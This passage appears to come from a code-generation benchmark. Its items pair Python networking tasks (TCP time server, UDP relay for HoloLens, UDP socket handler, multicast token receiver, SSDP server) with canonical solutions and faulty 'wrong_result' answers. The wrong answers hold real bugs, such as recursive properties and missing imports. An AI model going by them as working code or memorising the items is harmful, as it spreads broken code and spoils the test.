    "wrong_result": "```python\nimport threading\nimport socketserver\nfrom queue import Queue\nimport socket\n\nclass MessageServer(socketserver.ThreadingTCPServer):\n    def __init__(self, server_address):\n        super().__init__(server_address, MessageTCPHandler)\n        self.server_thread = threading.Thread(target=self.serve_forever, daemon=True)\n        self.request_verified = threading.Event()\n        self._client_socket = None\n        self.message_handled = threading.Event()\n        self.server_thread.start()\n\n    def send(self, message):\n        if self._client_socket:\n            try:\n                self._client_socket.sendall(message.encode())\n            except socket.error:\n                self._client_socket = None\n\n    def get_client_socket(self):\n        self.request_verified.wait()\n        return self._client_socket\n\n    def verify_request(self, request, client_address):\n        if self._client_socket is None:\n            self._client_socket = request\n            self.request_verified.set()\n            return True\n        return False\n\n\nclass MessageTCPHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        while True:\n            data = self.request.recv(1024).strip()\n            if not data:\n                break\n            print(f\"Received message: {data.decode()}\")\n            response = f\"Echo: {data.decode()}\"\n            self.server.send(response)\n            self.server.message_handled.set()\n\n\nif __name__ == \"__main__\":\n    HOST, PORT = \"localhost\", 9999\n    server = MessageServer((HOST, PORT))\n    try:\n        while True:\n            pass\n    except KeyboardInterrupt:\n        server.shutdown()\n        server.server_close()\n```"
  },
  {
    "Task_id": 414,
    "Instruction": "Task Description: Implement a TCP server for clock synchronization that responds to client requests with the current time provided by a time function.\n\nClass Description: The system consists of three classes working together to create a threaded TCP server that handles time synchronization requests. The server responds to \"sync\" messages with the current timestamp.\n\nAttributes:\n\nserver: [Time_Echo_Server] - The TCP server instance handling client connections\nthread: [threading.Thread] - The thread running the server's serve_forever loop\n\nMethods:\n\n__init__: [Name](time_fn: callable) -> [None] - Initializes the clock synchronization server with a time-providing function\nstop: [Name]() -> [None] - Shuts down the server and joins the server thread\nport: [property]() -> [int] - Returns the port number the server is bound to (read-only)\nhost: [property]() -> [str] - Returns the host address the server is bound to (read-only)",
    "Canonical_solution": "import socket\nimport socketserver\nimport struct\nimport threading\nfrom functools import partial\n\nclass Time_Echo(socketserver.BaseRequestHandler):\n    def __init__(self, *args, time_fn, **kwargs):\n        self.time_fn = time_fn\n        super().__init__(*args, **kwargs)\n\n    def handle(self):\n        while True:\n            data = self.request.recv(4)\n            if not data:\n                break\n            if data.decode(\"utf-8\") == \"sync\":\n                self.request.send(struct.pack(\"<d\", self.time_fn()))\n\nclass Time_Echo_Server(socketserver.ThreadingTCPServer):\n    def __init__(self, *, time_fn, host=\"\", **kwargs):\n        handler_class = partial(Time_Echo, time_fn=time_fn)\n        super().__init__((host, 0), handler_class, **kwargs)\n        self.allow_reuse_address = True\n\n    @property\n    def host(self) -> str:\n        return self.server_address[0]\n\n    @property\n    def port(self) -> int:\n        return self.server_address[1]\n\nclass Clock_Sync_Server:\n    def __init__(self, time_fn):\n        self.server = Time_Echo_Server(time_fn=time_fn)\n        self.thread = threading.Thread(target=self.server.serve_forever)\n        self.thread.start()\n\n    def stop(self):\n        self.server.shutdown()\n        self.thread.join()\n\n    @property\n    def port(self):\n        return self.server.port\n\n    @property\n    def host(self):\n        return self.server.host",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "import socket\nimport threading\nfrom datetime import datetime\n\nclass Time_Echo_Server:\n    def __init__(self, time_fn):\n        self.time_fn = time_fn\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind(('localhost', 0))\n        self.host, self.port = self.server_socket.getsockname()\n        self.server = socketserver.ThreadingTCPServer((self.host, self.port), self.RequestHandler)\n        self.thread = threading.Thread(target=self.server.serve_forever)\n        self.thread.start()\n\n    def stop(self):\n        self.server.shutdown()\n        self.thread.join()\n\n    class RequestHandler(socketserver.BaseRequestHandler):\n        def handle(self):\n            data = self.request.recv(1024).strip()\n            if data == b\"sync\":\n                current_time = self.server.server.time_fn().strftime('%Y-%m-%d %H:%M:%S')\n                self.request.sendall(current_time.encode())\n\n    @property\n    def port(self):\n        return self.port\n\n    @property\n    def host(self):\n        return self.host\n\n# Example usage:\n# server = Time_Echo_Server(datetime.now)\n# print(f\"Server running on {server.host}:{server.port}\")\n# # To stop the server:\n# # server.stop()"
  },
  {
    "Task_id": 423,
    "Instruction": "Task Description: Create a UDP-based relay class for HoloLens communication that handles both receiving data from HoloLens and forwarding it via ZeroMQ, as well as receiving commands from ZeroMQ and sending responses back to HoloLens.\n\nClass Description: Hololens_Relay is a class that establishes a bidirectional communication bridge between a HoloLens device (via UDP) and other processes (via ZeroMQ). It manages socket connections, message routing, and protocol handling for gaze data and calibration results.\n\nAttributes:\n- context: [zmq.Context] - ZeroMQ context for IPC communication\n- thread_pipe: [zmq.Socket] - Pipe for communicating with the worker thread\n- host: [str] - Host address for UDP binding\n- port: [str] - Port number for UDP binding\n- ipc_push_url: [str] - ZeroMQ URL for pushing messages\n- ipc_sub_url: [str] - ZeroMQ URL for subscribing to messages\n- gaze_receiver: [tuple] - Address of the current gaze data receiver\n- calib_result_receiver: [tuple] - Address of the current calibration result receiver\n\nMethods:\n- __init__(zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\") -> [None] - Initializes the relay with ZMQ context and connection URLs\n- start_server(new_address) -> [bool] - Binds the UDP socket to the specified address and starts the server\n- stop_server() -> [None] - Stops the server and cleans up resources\n- thread_loop(context, pipe) -> [None] - Main worker thread that handles message polling and routing (private method)\n- on_recv(socket, ipc_pub) -> [None] - Handles incoming UDP messages and generates appropriate responses (private method)",
    "Canonical_solution": "import socket\nimport zmq\nimport zmq_tools\nfrom pyre import zhelper\n\nclass Hololens_Relay:\n    def __init__(self, zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\"):\n        self.context = zmq_ctx\n        self.thread_pipe = zhelper.zthread_fork(self.context, self.thread_loop)\n        self.host = host\n        self.port = port\n        self.ipc_push_url = ipc_push_url\n        self.ipc_sub_url = ipc_sub_url\n        self.start_server(f\"{host}:{port}\")\n\n    def start_server(self, new_address):\n        self.thread_pipe.send_string(\"Bind\", flags=zmq.SNDMORE)\n        self.thread_pipe.send_string(new_address)\n        response = self.thread_pipe.recv_string()\n        msg = self.thread_pipe.recv_string()\n        if response == \"Bind OK\":\n            host, port = msg.split(\":\")\n            self.host = host\n            self.port = port\n            return True\n        return False\n\n    def stop_server(self):\n        self.thread_pipe.send_string(\"Exit\")\n        while self.thread_pipe:\n            pass\n\n    def thread_loop(self, context, pipe):\n        poller = zmq.Poller()\n        ipc_pub = zmq_tools.Msg_Dispatcher(context, self.ipc_push_url)\n        ipc_sub = zmq_tools.Msg_Receiver(\n            context,\n            self.ipc_sub_url,\n            (\"gaze\", \"notify.calibration.failed\", \"notify.calibration.successful\"),\n        )\n        poller.register(pipe, zmq.POLLIN)\n        poller.register(ipc_sub.socket, zmq.POLLIN)\n        remote_socket = None\n        self.gaze_receiver = None\n        self.calib_result_receiver = None\n\n        while True:\n            items = [sock for sock, _ in poller.poll()]\n            if pipe in items:\n                cmd = pipe.recv_string()\n                if cmd == \"Exit\":\n                    break\n                elif cmd == \"Bind\":\n                    new_url = pipe.recv_string()\n                    if remote_socket:\n                        poller.unregister(remote_socket)\n                        remote_socket.close()\n                    try:\n                        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n                        remote_socket.setblocking(False)\n                        addr, port = new_url.split(\":\")\n                        socket_addr = (addr, int(port))\n                        remote_socket.bind(socket_addr)\n                    except OSError:\n                        remote_socket = None\n                        pipe.send_string(\"Error\", flags=zmq.SNDMORE)\n                        pipe.send_string(f\"Could not bind to Socket: {new_url}\")\n                    else:\n                        pipe.send_string(\"Bind OK\", flags=zmq.SNDMORE)\n                        pipe.send_string(new_url)\n                        poller.register(remote_socket, zmq.POLLIN)\n\n            if remote_socket and remote_socket.fileno() in items:\n                self.on_recv(remote_socket, ipc_pub)\n\n            if ipc_sub.socket in items:\n                while ipc_sub.new_data:\n                    topic, payload = ipc_sub.recv()\n                    if self.gaze_receiver and remote_socket and topic.startswith(\"gaze\"):\n                        method, eye = payload[\"topic\"].split(\".\")[1:3]\n                        if method == \"2d\":\n                            data = b\"EG%s%s%s\" % (\n                                method[:1].encode(),\n                                eye.encode(),\n                                struct.pack(\"ff\", *payload[\"norm_pos\"]),\n                            )\n                        elif method == \"3d\":\n                            data = b\"EG%s%s%s\" % (\n                                method[:1].encode(),\n                                eye.encode(),\n                                struct.pack(\"fff\", *payload[\"gaze_point_3d\"]),\n                            )\n                        remote_socket.sendto(data, self.gaze_receiver)\n\n                    elif (self.calib_result_receiver and remote_socket and \n                          topic.startswith(\"notify.calibration.\")):\n                        if payload[\"subject\"] == \"calibration.successful\":\n                            remote_socket.sendto(b\"ECS\", self.calib_result_receiver)\n                            self.calib_result_receiver = None\n                        elif payload[\"subject\"] == \"calibration.failed\":\n                            remote_socket.sendto(b\"ECF\", self.calib_result_receiver)\n                            self.calib_result_receiver = None\n\n        if remote_socket:\n            remote_socket.close()\n\n    def on_recv(self, socket, ipc_pub):\n        try:\n            byte_msg, sender = socket.recvfrom(2048)\n        except OSError:\n            return\n\n        if byte_msg[:1] == b\"R\":\n            try:\n                ipc_pub.socket.send_string(\"notify.calibration.add_ref_data\", flags=zmq.SNDMORE)\n                ipc_pub.socket.send(byte_msg[1:])\n                response = b\"0R\"\n            except Exception as e:\n                response = b\"FRReference point mal-formatted or missing: %s\" % str(e).encode()\n        elif byte_msg[:1] == b\"S\":\n            self.gaze_receiver = sender\n            response = b\"0S\"\n        elif byte_msg[:1] == b\"s\":\n            self.gaze_receiver = None\n            response = b\"0s\"\n        elif byte_msg[:1] == b\"I\":\n            mode = byte_msg[1:2]\n            init_2d = mode == b\"2\"\n            calib_method = \"HMD_Calibration\" if init_2d else \"HMD_Calibration_3D\"\n            ipc_pub.notify({\"subject\": \"start_plugin\", \"name\": calib_method})\n            response = b\"0I\"\n        elif byte_msg[:1] == b\"i\":\n            response = b\"0i\"\n        elif byte_msg[:1] == b\"C\":\n            self.calib_result_receiver = sender\n            response = b\"0C\"\n        elif byte_msg[:1] == b\"c\":\n            response = b\"0c\"\n        elif byte_msg[:1] == b\"T\":\n            try:\n                target = struct.unpack(\"f\", byte_msg[1:])[0]\n                response = b\"0T\"\n            except Exception:\n                response = b\"FT'%s' cannot be converted to float.\" % (byte_msg[1])\n        elif byte_msg[:1] == b\"V\":\n            response = b\"0V%s\" % bytes(__version__)\n        else:\n            response = b'FFUnknown command. \"%s\"' % byte_msg\n\n        socket.sendto(response, sender)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport zmq\nimport socket\nimport threading\n\nclass Hololens_Relay:\n    def __init__(self, zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\"):\n        self.context = zmq_ctx\n        self.thread_pipe = self.context.socket(zmq.PAIR)\n        self.host = host\n        self.port = port\n        self.ipc_push_url = ipc_push_url\n        self.ipc_sub_url = ipc_sub_url\n        self.gaze_receiver = None\n        self.calib_result_receiver = None\n        self.udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.udp_socket.setblocking(0)\n        self.running = False\n\n    def start_server(self, new_address):\n        try:\n            self.udp_socket.bind((self.host, int(self.port)))\n            self.running = True\n            self.thread = threading.Thread(target=self.thread_loop, args=(self.context, self.thread_pipe))\n            self.thread.start()\n            return True\n        except Exception as e:\n            print(f\"Error starting server: {e}\")\n            return False\n\n    def stop_server(self):\n        self.running = False\n        self.thread.join()\n        self.udp_socket.close()\n\n    def thread_loop(self, context, pipe):\n        ipc_sub = context.socket(zmq.SUB)\n        ipc_sub.connect(self.ipc_sub_url)\n        ipc_sub.subscribe(b\"\")\n\n        while self.running:\n            try:\n                events = zmq.select([ipc_sub, pipe], [], [], 0.1)\n                if ipc_sub in events[0]:\n                    msg = ipc_sub.recv_multipart()\n                    self.on_recv(None, msg)\n                if pipe in events[0]:\n                    msg = pipe.recv()\n                    # Handle control messages if needed\n            except Exception as e:\n                print(f\"Error in thread loop: {e}\")\n\n    def on_recv(self, socket, ipc_pub):\n        try:\n            data, addr = self.udp_socket.recvfrom(4096)\n            if b\"gaze\" in data:\n                if self.gaze_receiver:\n                    self.udp_socket.sendto(data, self.gaze_receiver)\n            elif b\"calib\" in data:\n                if self.calib_result_receiver:\n                    self.udp_socket.sendto(data, self.calib_result_receiver)\n        except BlockingIOError:\n            pass\n        except Exception as e:\n            print(f\"Error processing UDP message: {e}\")\n```"
  },
  {
    "Task_id": 424,
    "Instruction": "Task Description: Implement a UDP communication class that handles socket creation, data transmission, and reception with proper connection management and error handling.\n\nClass Description: The UDPCommunication class provides functionality for UDP-based network communication, including opening/closing connections, sending/receiving data, and managing connection status. It uses threading for asynchronous data reception and includes signal-based notification for connection status changes.\n\nAttributes:\n- conn: [socket.socket] - The UDP socket object used for communication\n- status: [ConnectionStatus] - Current connection status (CONNECTED/CLOSED)\n- config: [dict] - Configuration dictionary containing protocol, port, and target information\n- onConnectionStatus: [pyqtSignal] - Signal emitted when connection status changes\n- hintSignal: [pyqtSignal] - Signal for displaying error messages or hints\n- receiveProcess: [threading.Thread] - Thread handling incoming data reception\n\nMethods:\n- __init__() -> None - Initializes the UDP communication object with default configuration\n- openCloseSerial() -> None - Toggles connection state (opens if closed, closes if open)\n- receiveDataProcess(conn: socket.socket) -> None - Thread function for receiving data (private method)\n- send(data: bytes) -> None - Sends data to configured target\n- checkTarget(target: str) -> tuple - Validates and parses target address into (host, port) tuple\n- isConnected() -> bool - Returns current connection status\n- getConnStatus() -> ConnectionStatus - Returns current connection status object",
    "Canonical_solution": "from PyQt5.QtCore import pyqtSignal, QObject\nimport socket\nimport threading\nimport time\nimport re\n\nclass UDPCommunication:\n    def __init__(self):\n        self.conn = None\n        self.status = ConnectionStatus.CLOSED\n        self.config = {\n            \"protocol\": \"udp\",\n            \"port\": 2345,\n            \"target\": [\"127.0.0.1:2345\", [\"127.0.0.1:2345\"]]\n        }\n        self.onConnectionStatus = pyqtSignal(ConnectionStatus, str)\n        self.hintSignal = pyqtSignal(str, str, str)\n\n    def openCloseSerial(self):\n        if self.status == ConnectionStatus.CLOSED:\n            try:\n                self.conn = socket.socket(type=socket.SOCK_DGRAM)\n                self.conn.bind((\"0.0.0.0\", self.config[\"port\"]))\n                self.status = ConnectionStatus.CONNECTED\n                self.receiveProcess = threading.Thread(target=self.receiveDataProcess, args=(self.conn,))\n                self.receiveProcess.setDaemon(True)\n                self.receiveProcess.start()\n                self.onConnectionStatus.emit(self.status, \"\")\n            except Exception as e:\n                msg = _(\"Connect Failed\") + \"\\n\" + str(e)\n                self.hintSignal.emit(\"error\", _(\"Error\"), msg)\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status, msg)\n        else:\n            self.status = ConnectionStatus.CLOSED\n            if self.conn:\n                self.conn.close()\n                self.conn = None\n            self.onConnectionStatus.emit(self.status, \"\")\n\n    def receiveDataProcess(self, conn):\n        buffer = b''\n        t = 0\n        conn.settimeout(0.1)\n        while self.status != ConnectionStatus.CLOSED:\n            try:\n                data, target = conn.recvfrom(4096)\n                if data:\n                    if len(data) > 4096:\n                        flush = False\n                    t = time.time()\n                    buffer += data\n                    if buffer and (time.time() - t > 0.001):\n                        try:\n                            if buffer:\n                                self.onReceived(buffer)\n                        except Exception as e:\n                            print(\"-- error in onReceived callback:\", e)\n                        buffer = b''\n            except socket.timeout:\n                continue\n            except Exception as e:\n                print(\"-- recv error:\", e)\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status, _(\"Connection closed!\") + \" \" + str(e))\n                try:\n                    conn.close()\n                except Exception:\n                    pass\n                break\n\n    def send(self, data: bytes):\n        if self.conn and self.status == ConnectionStatus.CONNECTED:\n            target = self.checkTarget(self.config[\"target\"][0])\n            if not target:\n                self.hintSignal.emit(\"error\", _(\"Target error\"), _(\"Target error\") + \": \" + self.config[\"target\"])\n            self.conn.sendto(data, target)\n\n    def checkTarget(self, target):\n        if not target:\n            return None\n        host = target\n        port = 80\n        target = target.replace(\"\uff1a\", \":\")\n        if target.endswith(\":\"):\n            target = target[:-1]\n        _host = re.match('http(.*)://(.*)', target)\n        if _host:\n            s, target = _host.groups()\n            host = target\n        _host = re.match('(.*):(\\d*)', target)\n        if _host:\n            host, port = _host.groups()\n            port = int(port)\n        if host.endswith(\"/\"):\n            host = host[:-1]\n        return (host, port)\n\n    def isConnected(self):\n        return self.status == ConnectionStatus.CONNECTED\n\n    def getConnStatus(self):\n        return self.status",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport threading\nfrom PyQt5.QtCore import pyqtSignal, QObject\n\nclass ConnectionStatus:\n    CONNECTED = \"CONNECTED\"\n    CLOSED = \"CLOSED\"\n\nclass UDPCommunication(QObject):\n    onConnectionStatus = pyqtSignal(ConnectionStatus)\n    hintSignal = pyqtSignal(str)\n\n    def __init__(self):\n        super().__init__()\n        self.conn = None\n        self.status = ConnectionStatus.CLOSED\n        self.config = {\n            'protocol': 'udp',\n            'port': 12345,\n            'target': 'localhost'\n        }\n        self.receiveProcess = None\n\n    def openCloseSerial(self):\n        if self.status == ConnectionStatus.CLOSED:\n            self.openConnection()\n        else:\n            self.closeConnection()\n\n    def openConnection(self):\n        try:\n            self.conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            host, port = self.checkTarget(self.config['target'])\n            self.conn.bind((host, port))\n            self.status = ConnectionStatus.CONNECTED\n            self.onConnectionStatus.emit(self.status)\n            self.startReceiving()\n        except Exception as e:\n            self.hintSignal.emit(f\"Failed to open connection: {str(e)}\")\n\n    def closeConnection(self):\n        if self.conn:\n            self.conn.close()\n            self.conn = None\n            self.status = ConnectionStatus.CLOSED\n            self.onConnectionStatus.emit(self.status)\n            if self.receiveProcess and self.receiveProcess.is_alive():\n                self.receiveProcess.join()\n\n    def startReceiving(self):\n        self.receiveProcess = threading.Thread(target=self.receiveDataProcess, args=(self.conn,))\n        self.receiveProcess.daemon = True\n        self.receiveProcess.start()\n\n    def receiveDataProcess(self, conn):\n        while self.status == ConnectionStatus.CONNECTED:\n            try:\n                data, addr = conn.recvfrom(1024)\n                print(f\"Received data from {addr}: {data.decode('utf-8')}\")\n            except Exception as e:\n                self.hintSignal.emit(f\"Error receiving data: {str(e)}\")\n                break\n\n    def send(self, data: bytes):\n        if self.status == ConnectionStatus.CONNECTED:\n            try:\n                host, port = self.checkTarget(self.config['target'])\n                self.conn.sendto(data, (host, port))\n            except Exception as e:\n                self.hintSignal.emit(f\"Failed to send data: {str(e)}\")\n        else:\n            self.hintSignal.emit(\"Connection is not open\")\n\n    def checkTarget(self, target: str) -> tuple:\n        try:\n            host, port = target.split(':')\n            port = int(port)\n            return host, port\n        except ValueError:\n            raise ValueError(\"Invalid target format. Use 'host:port'.\")\n\n    def isConnected(self) -> bool:\n        return self.status == ConnectionStatus.CONNECTED\n\n    def getConnStatus(self) -> ConnectionStatus:\n        return self.status\n```"
  },
  {
    "Task_id": 425,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with advanced features like receiving destination address information and binding to any available interface.\n\nClass Description: The UDPSocketHandler class provides methods for setting up UDP listeners, receiving UDP packets with ancillary data (including destination address), and sending UDP packets with specific source binding. It's designed for scenarios where you need detailed control over UDP communication, such as when implementing network proxies or specialized UDP services.\n\nAttributes:\n[Note: The reference implementation doesn't show any instance attributes, but uses class-level constants]\nIP_BINDANY: [int] - Socket option constant for binding to any available interface\nIP_RECVDSTADDR: [int] - Socket option constant for receiving destination address information\n\nMethods:\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP data along with source and destination address information\n  Parameters:\n    - listener: The UDP socket to receive data from\n    - bufsize: Maximum amount of data to receive\n  Returns:\n    - tuple: (srcip, dstip, data) where:\n      srcip: Source address (IP, port)\n      dstip: Destination address (IP, port) or None\n      data: Received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP data with specific source binding\n  Parameters:\n    - sock: The original socket (used for family information)\n    - srcip: Source address (IP, port) to bind to\n    - dstip: Destination address (IP, port) to send to\n    - data: Data to send\n  Returns: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures a UDP listener socket to receive destination address information\n  Parameters:\n    - udp_listener: An object containing v4 and/or v6 socket instances\n  Returns: None",
    "Canonical_solution": "import socket\nimport subprocess as ssubprocess\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_BINDANY = 24\nIP_RECVDSTADDR = 7\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(4096,\n                                                  socket.CMSG_SPACE(4))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_RECVDSTADDR:\n                port = 53\n                ip = socket.inet_ntop(socket.AF_INET, cmsg_data[0:4])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n               \"-- ignored UDP to %r: \"\n               \"couldn't determine source IP address\" % (dstip,))\n            return\n\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_IP, IP_BINDANY, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\n\nclass UDPSocketHandler:\n    IP_BINDANY = 0\n    IP_RECVDSTADDR = 25\n\n    @staticmethod\n    def recv_udp(listener: socket.socket, bufsize: int) -> tuple:\n        data, srcip = listener.recvfrom(bufsize, socket.MSG_ERRQUEUE)\n        dstip = None\n        try:\n            _, ancdata, _, _ = listener.recvmsg(bufsize, socket.CMSG_LEN(16))\n            for cmsg_level, cmsg_type, cmsg_data in ancdata:\n                if cmsg_level == socket.IPPROTO_IP and cmsg_type == UDPSocketHandler.IP_RECVDSTADDR:\n                    dstip = cmsg_data[:16]\n                    break\n        except socket.error:\n            pass\n        return srcip, dstip, data\n\n    @staticmethod\n    def send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None:\n        with socket.socket(sock.family, socket.SOCK_DGRAM) as temp_sock:\n            temp_sock.bind(srcip)\n            temp_sock.sendto(data, dstip)\n\n    @staticmethod\n    def setup_udp_listener(udp_listener: object) -> None:\n        if hasattr(udp_listener, 'v4'):\n            udp_listener.v4.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            udp_listener.v4.setsockopt(socket.IPPROTO_IP, UDPSocketHandler.IP_RECVDSTADDR, 1)\n        if hasattr(udp_listener, 'v6'):\n            udp_listener.v6.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            udp_listener.v6.setsockopt(socket.IPPROTO_IPV6, UDPSocketHandler.IP_RECVDSTADDR, 1)"
  },
  {
    "Task_id": 426,
    "Instruction": "Task Description: Implement a function to receive a multicast token via UDP communication, handling potential timeouts and interruptions gracefully.\n\nFunction Description: The function continuously listens for incoming UDP packets on a specified port, attempting to extract and decode a token from valid JSON messages. It runs in a loop until either a valid token is received or a cancellation flag is set. The function handles socket timeouts and other exceptions silently, only processing valid messages that match the expected format.\n\nInput: None (uses global variables for control flow)\n\nOutput: None (modifies global variable 'multicast_token' when successful)",
    "Canonical_solution": "import socket\nimport struct\nimport json\nimport threading\n\nglobal multicast_token, cancel_thread\nmulticast_token = None\ncancel_thread = False\n\ndef receive_token():\n    global multicast_token, cancel_thread\n    received_token = False\n    while received_token == False and cancel_thread == False:\n        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n        s.bind(('0.0.0.0', 6669))\n        s.settimeout(2)\n        try:\n            # despite suggestions of being unused, addr must remain present, or this will fail\n            msg, addr = s.recvfrom(255)\n            (msglen,) = struct.unpack(\">I\", msg[12:16])\n            msg = msg[16: msglen + 8].decode()\n            msg = json.loads(msg)\n            token = msg[\"token\"]\n            received_token = True\n            s.close()\n            multicast_token = token\n        except KeyboardInterrupt:\n            return\n        except:\n            pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\nimport json\n\ndef receive_multicast_token():\n    global multicast_token, cancellation_flag\n    multicast_token = None\n    cancellation_flag = False\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(1)  # Set timeout for receiving data\n\n    try:\n        while not cancellation_flag:\n            try:\n                data, addr = sock.recvfrom(1024)\n                message = json.loads(data.decode('utf-8'))\n                if 'token' in message:\n                    multicast_token = message['token']\n                    break\n            except socket.timeout:\n                continue\n            except json.JSONDecodeError:\n                continue\n    finally:\n        sock.close()"
  },
  {
    "Task_id": 428,
    "Instruction": "Task Description: Implement a Simple Service Discovery Protocol (SSDP) server using UDP multicast communication to handle device discovery and announcement in a network.\n\nClass Description: The SSDPServer class implements an SSDP server that listens for M-SEARCH requests and responds with device information. It supports device registration, unregistration, and sending byebye notifications when shutting down.\n\nAttributes:\n- ip_list: [list] - List of tuples containing local IP addresses and their subnet masks\n- sock_list: [list] - List of socket objects for each IP address\n- sock: [socket.socket] - Main UDP socket for communication\n- running: [bool] - Flag indicating if the server is running\n- ssdp_thread: [threading.Thread] - Thread running the server's main loop\n- sending_byebye: [bool] - Flag controlling whether to send byebye notifications\n- known: [dict] - Dictionary of registered services with their USN as keys\n\nMethods:\n- __init__() -> None - Initializes the SSDP server with default values\n- start() -> None - Starts the SSDP server thread\n- stop(byebye: bool) -> None - Stops the SSDP server thread, with option to send byebye notifications\n- run() -> None - Main server loop that handles incoming requests\n- datagram_received(data: bytes, host_port: tuple) -> None - Processes incoming UDP datagrams\n- discovery_request(headers: dict, host_port: tuple) -> None - Handles M-SEARCH discovery requests\n- get_subnet_ip(ip: str, mask: str) -> list - Calculates subnet IP address\n- shutdown() -> None - Cleans up resources and sends byebye notifications\n- register(usn: str, st: str, location: str, server: str, cache_control: str) -> None - Registers a new service\n- unregister(usn: str) -> None - Unregisters a service\n- do_byebye(usn: str) -> None - Sends byebye notification for a service\n- send_it(response: str, destination: tuple) -> None - Sends a response to the specified destination",
    "Canonical_solution": "import sys\nimport random\nimport socket\nimport logging\nimport threading\nfrom email.utils import formatdate\n\nSSDP_PORT = 1900\nSSDP_ADDR = '239.255.255.250'\nSERVER_ID = 'SSDP Server'\n\nclass SSDPServer:\n    def __init__(self):\n        self.ip_list = []\n        self.sock_list = []\n        self.sock = None\n        self.running = False\n        self.ssdp_thread = None\n        self.sending_byebye = True\n        self.known = {}\n\n    def start(self):\n        if not self.running:\n            self.running = True\n            self.sending_byebye = True\n            self.ssdp_thread = threading.Thread(target=self.run, name=\"SSDP_THREAD\")\n            self.ssdp_thread.start()\n\n    def stop(self, byebye=True):\n        if self.running:\n            self.running = False\n            try:\n                socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b'', (SSDP_ADDR, SSDP_PORT))\n            except Exception:\n                pass\n            self.sending_byebye = byebye\n            if self.ssdp_thread is not None:\n                self.ssdp_thread.join()\n\n    def run(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)\n\n        if sys.platform == 'win32':\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        elif sys.platform == 'darwin':\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        elif hasattr(socket, \"SO_REUSEPORT\"):\n            try:\n                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n            except socket.error:\n                try:\n                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                except socket.error:\n                    pass\n\n        self.ip_list = [('192.168.137.1', '255.255.255.0')] if sys.platform == 'win32' else []\n        self.sock_list = []\n        for ip, mask in self.ip_list:\n            try:\n                mreq = socket.inet_aton(SSDP_ADDR) + socket.inet_aton(ip)\n                self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n                self.sock_list.append(Sock(ip))\n            except Exception:\n                pass\n\n        try:\n            self.sock.bind(('0.0.0.0', SSDP_PORT))\n        except Exception:\n            return\n        self.sock.settimeout(1)\n\n        while self.running:\n            try:\n                data, addr = self.sock.recvfrom(1024)\n                self.datagram_received(data, addr)\n            except socket.timeout:\n                continue\n\n        self.shutdown()\n        for ip, mask in self.ip_list:\n            mreq = socket.inet_aton(SSDP_ADDR) + socket.inet_aton(ip)\n            try:\n                self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP, mreq)\n            except Exception:\n                continue\n        self.sock.close()\n        self.sock = None\n\n    def datagram_received(self, data, host_port):\n        try:\n            header = data.decode().split('\\r\\n\\r\\n')[0]\n        except ValueError:\n            return\n        if len(header) == 0:\n            return\n\n        lines = header.split('\\r\\n')\n        cmd = lines[0].split(' ')\n        lines = map(lambda x: x.replace(': ', ':', 1), lines[1:])\n        lines = filter(lambda x: len(x) > 0, lines)\n        headers = dict(map(lambda x: (x[0].lower(), x[1]), [x.split(':', 1) for x in lines]))\n\n        if cmd[0] == 